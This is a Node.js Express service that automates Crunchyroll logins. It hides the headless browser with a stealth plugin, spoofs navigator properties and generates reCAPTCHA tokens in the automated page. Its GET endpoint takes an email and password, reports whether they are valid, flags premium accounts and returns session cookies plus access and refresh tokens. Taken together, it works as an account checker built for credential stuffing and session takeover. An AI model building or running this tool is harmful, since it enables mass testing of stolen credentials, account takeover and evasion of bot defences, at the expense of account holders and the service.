const express = require('express');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const crypto = require('crypto');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const app = express();
const PORT = 7860;

function getRealisticUserAgent() {
  const agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
  ];
  return agents[Math.floor(Math.random() * agents.length)];
}

async function setupSpoofing(page, userAgent) {
  await page.evaluateOnNewDocument(() => {
    delete navigator.__proto__.webdriver;
    Object.defineProperty(navigator, 'webdriver', { get: () => false });
    Object.defineProperty(navigator, 'plugins', {
      get: () => [
        { name: 'Chrome PDF Plugin', filename: 'internal-pdf-viewer' }
      ]
    });
    if (!window.chrome) {
      window.chrome = { runtime: {} };
    }
  });
}

async function exchangeEtpToken(etpRtValue) {
  const deviceId = crypto.randomUUID();
  const anonymousId = crypto.randomUUID();

  const params = new URLSearchParams();
  params.append('device_id', deviceId);
  params.append('device_type', 'Safari on iOS');
  params.append('grant_type', 'etp_rt_cookie');
  params.append('scope', 'offline_access');
  
  const headers = {
    'Authorization': 'Basic bm9haWhkZXZtXzZpeWcwYThsMHE6',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': 'application/json, text/plain, */*',
    'ETP-Anonymous-Id': anonymousId,
    'Cookie': `etp_rt=${etpRtValue}`
  };

  try {
    const response = await axios.post(
      'https://beta-api.crunchyroll.com/auth/v1/token',
      params.toString(),
      { headers }
    );

    console.log('✅ Token exchange successful:', response.data);
    return { success: true, tokenData: response.data };
  } catch (error) {
    console.error('⚠️ Failed to exchange token:', error.response?.data || error.message);
    return { success: false, error: error.response?.data || error.message };
  }
}

async function verifyLogin(email, password) {
  console.log('🔄 Launching browser...');
  
  const userAgent = getRealisticUserAgent();
  const siteKey = '6LeQj_wUAAAAABLdMxMxFF-x3Jvyd1hkbsRV9UAk';
  
  const browser = await puppeteer.launch({
    headless: 'new',
    args: [
      '--no-sandbox',
      '--disable-setuid-sandbox',
      '--disable-blink-features=AutomationControlled',
      '--window-size=1920,1080',
      `--user-agent=${userAgent}`
    ],
    ignoreDefaultArgs: ['--enable-automation']
  });

  try {
    const page = await browser.newPage();
    await setupSpoofing(page, userAgent);
    await page.setViewport({ width: 1920, height: 1080 });
    await page.setUserAgent(userAgent);

    console.log('📍 Navigating to SSO login...');
    await page.goto('https://sso.crunchyroll.com/login', {
      waitUntil: 'networkidle2',
      timeout: 60000
    });

    await new Promise(resolve => setTimeout(resolve, 2000));

    console.log('🔐 Attempting login...');
    
    const loginResult = await page.evaluate(async (loginData) => {
      try {
        // Load reCAPTCHA
        await new Promise((resolve, reject) => {
          if (window.grecaptcha?.ready) {
            resolve();
            return;
          }
          
          const script = document.createElement('script');
          script.src = `https://www.google.com/recaptcha/api.js?render=${loginData.siteKey}`;
          
          let resolved = false;
          script.onload = () => {
            const checkReady = setInterval(() => {
              if (window.grecaptcha?.ready && !resolved) {
                resolved = true;
                clearInterval(checkReady);
                setTimeout(resolve, 1000);
              }
            }, 100);
            
            setTimeout(() => {
              if (!resolved) {
                clearInterval(checkReady);
                reject(new Error('reCAPTCHA timeout'));
              }
            }, 20000);
          };
          
          script.onerror = () => reject(new Error('Failed to load reCAPTCHA'));
          document.head.appendChild(script);
        });

        // Get reCAPTCHA token
        const recaptchaToken = await new Promise((resolve, reject) => {
          grecaptcha.ready(async () => {
            try {
              const token = await grecaptcha.execute(loginData.siteKey, { action: 'login' });
              resolve(token);
            } catch (error) {
              reject(error);
            }
          });
        });

        // Perform login
        const response = await fetch('https://sso.crunchyroll.com/api/login', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          },
          body: JSON.stringify({
            email: loginData.email,
            password: loginData.password,
            recaptchaToken: recaptchaToken,
            eventSettings: {}
          }),
          credentials: 'include'
        });
        
        const data = await response.json();
        
        return {
          status: response.status,
          ok: response.ok,
          data: data
        };
      } catch (error) {
        return {
          error: error.message,
          stack: error.stack
        };
      }
    }, { email, password, siteKey });
    
    console.log('📊 Login response:', JSON.stringify(loginResult));
    
    // Check if login was successful
    if (loginResult.error) {
      return {
        success: false,
        valid: false,
        message: 'Login request failed',
        error: loginResult.error
      };
    }
    
    if (loginResult.status === 200 && loginResult.ok && loginResult.data.status === 'ok') {
      console.log('✅ Login successful - credentials are valid');
      
      // Wait a moment for cookies to be set
      await new Promise(resolve => setTimeout(resolve, 1000));
      
      // Extract etp_rt cookie
      const cookies = await page.cookies();
      const etpCookie = cookies.find(c => c.name === 'etp_rt');
      
      if (etpCookie) {
        console.log('✅ Found etp_rt cookie:', etpCookie.value.substring(0, 20) + '...');
        
        // Get all cookies to pass along
        const allCookies = await page.cookies();
        const cookieString = allCookies
          .filter(c => c.domain.includes('crunchyroll'))
          .map(c => `${c.name}=${c.value}`)
          .join('; ');
        
        // Exchange etp_rt for bearer token
        const tokenExchange = await exchangeEtpToken(etpCookie.value);
        
        if (tokenExchange.success) {
  const accessToken = tokenExchange.tokenData.access_token;

  // 🔹 Inline premium check
  let premium = false;
  try {
    const accountRes = await axios.get('https://beta-api.crunchyroll.com/accounts/v1/me', {
      headers: { Authorization: `Bearer ${accessToken}`, Accept: 'application/json' }
    });

    const externalId = accountRes.data.external_id;
    if (externalId) {
      const subsRes = await axios.get(
        `https://beta-api.crunchyroll.com/subs/v1/subscriptions/${externalId}/benefits`,
        { headers: { Authorization: `Bearer ${accessToken}`, Accept: 'application/json' } }
      );

      const benefits = subsRes.data.items?.map(b => b.benefit) || [];
      premium = benefits.includes('cr_premium');
    }
  } catch (err) {
    if (err.response?.status !== 404) console.warn('⚠️ Could not check premium status:', err.message);
  }

  // 🔹 Return full login info including premium
  return {
    success: true,
    valid: true,
    message: 'Email and password are correct',
    email: email,
    etpRt: etpCookie.value,
    accessToken: accessToken,
    refreshToken: tokenExchange.tokenData.refresh_token,
    expiresIn: tokenExchange.tokenData.expires_in,
    tokenType: tokenExchange.tokenData.token_type,
    premium: premium
  };
} else {
          return {
            success: true,
            valid: true,
            message: 'Login successful but token exchange failed',
            email: email,
            etpRt: etpCookie.value,
            tokenExchangeError: tokenExchange.error
          };
        }
      } else {
        console.warn('⚠️ No etp_rt cookie found; login may not have completed fully.');
        return {
          success: true,
          valid: true,
          message: 'Login successful but etp_rt cookie not found',
          email: email
        };
      }
    } else if (loginResult.status === 401 || loginResult.status === 403) {
      console.log('❌ Login failed - invalid credentials');
      return {
        success: true,
        valid: false,
        message: 'Invalid email or password',
        email: email,
        details: loginResult.data
      };
    } else {
      console.log('⚠️ Unexpected response:', loginResult.status);
      return {
        success: true,
        valid: false,
        message: 'Login failed',
        email: email,
        statusCode: loginResult.status,
        details: loginResult.data
      };
    }

  } catch (error) {
    console.error('❌ Error:', error.message);
    return {
      success: false,
      valid: false,
      message: 'Error during login verification',
      error: error.message
    };
  } finally {
    await browser.close();
  }
}

app.get('/login', async (req, res) => {
  const { email, password } = req.query;

  if (!email || !password) {
    return res.status(200).json({
      success: false,
      valid: false,
      message: 'Missing email or password in query parameters'
    });
  }

  try {
    console.log(`\n🚀 Login verification for: ${email}`);
    console.log(`⏰ ${new Date().toISOString()}`);
    
    const result = await verifyLogin(email, password);

    res.status(200).json(result);

  } catch (error) {
    console.error('❌ Error:', error.message);
    res.status(200).json({
      success: false,
      valid: false,
      message: 'Server error during verification',
      error: error.message
    });
  }
});

app.get('/', (req, res) => {
  res.json({
    status: 'online',
    message: 'Crunchyroll Login Verification API with Token Exchange',
    description: 'Verifies email/password and returns bearer token',
    usage: 'GET /login?email=YOUR_EMAIL&password=YOUR_PASSWORD',
    response: {
      success: 'true if request completed, false if error',
      valid: 'true if credentials are correct, false if incorrect',
      message: 'Human-readable message',
      email: 'The email that was checked',
      accessToken: 'Bearer token for API access (if valid)',
      refreshToken: 'Refresh token for renewing access',
      expiresIn: 'Token expiration time in seconds',
      etpRt: 'The etp_rt cookie value'
    }
  });
});

app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 http://localhost:${PORT}/login?email=YOUR_EMAIL&password=YOUR_PASSWORD`);
  console.log(`✅ Login verification with automatic token exchange`);
});
